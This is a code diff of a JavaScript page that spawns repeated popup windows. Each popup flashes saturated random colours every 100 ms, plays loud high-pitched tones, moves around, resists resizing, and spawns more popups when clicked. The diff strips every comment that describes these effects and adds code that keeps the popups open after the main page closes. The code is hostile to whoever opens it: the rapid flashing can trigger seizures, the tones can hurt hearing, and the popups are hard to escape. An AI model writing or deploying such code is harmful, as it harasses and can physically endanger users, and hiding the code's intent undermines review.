@@ -39,10 +39,9 @@ function startMainEffects() {
     if (!audioCtx) return;
     const osc = audioCtx.createOscillator();
     const gain = audioCtx.createGain();
-    // Sharp, loud sound
     osc.type = Math.random() > 0.5 ? 'square' : 'sawtooth';
-    osc.frequency.value = 800 + Math.random() * 3000; // high pitch
-    gain.gain.setValueAtTime(0.5, audioCtx.currentTime); // loud
+    osc.frequency.value = 800 + Math.random() * 3000;
+    gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
     gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.15);
     osc.connect(gain).connect(audioCtx.destination);
     osc.start();
@@ -58,8 +57,8 @@ const popupContent = `
 <style>html,body{margin:0;height:100%;cursor:pointer;}</style></head>
 <body>
 <script>
-const minW = 200; // smallest width
-const minH = 150; // smallest height
+const minW = 200;
+const minH = 150;
 
 function enforceMinSize() {
   try {
@@ -70,21 +69,19 @@ function enforceMinSize() {
 }
 setInterval(enforceMinSize, 100);
 
-// Color chaos
 setInterval(() => {
   document.body.style.backgroundColor =
     'hsl(' + Math.floor(Math.random()*360) + ',100%,50%)';
 }, 100);
 
-// Loud, sharp sounds
 setInterval(() => {
   try {
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     const osc = ctx.createOscillator();
     const gain = ctx.createGain();
     osc.type = Math.random() > 0.5 ? 'square' : 'sawtooth';
-    osc.frequency.value = 1000 + Math.random()*4000; // very high pitch
-    gain.gain.setValueAtTime(0.5, ctx.currentTime); // loud
+    osc.frequency.value = 1000 + Math.random()*4000;
+    gain.gain.setValueAtTime(0.5, ctx.currentTime);
     gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.12);
     osc.connect(gain).connect(ctx.destination);
     osc.start();
@@ -93,7 +90,6 @@ setInterval(() => {
   } catch(e){}
 }, 180);
 
-// Clicking inside popup spawns more popups
 document.addEventListener("click", () => {
   if (window.opener && !window.opener.closed) {
     window.opener.spawnPopup();
@@ -109,12 +105,14 @@ function spawnPopup() {
   const minW = 200, minH = 150;
   const w = window.open('', '_blank', `width=${minW},height=${minH},left=150,top=150`);
   if (w) {
+    // Break the link so the popup won't close with the main page
+    try { w.opener = null; } catch(e) {}
+
     w.document.open();
     w.document.write(popupContent);
     w.document.close();
     popupWindows.push(w);
 
-    // Random movement
     const moveInterval = setInterval(() => {
       if (w.closed) {
         clearInterval(moveInterval);
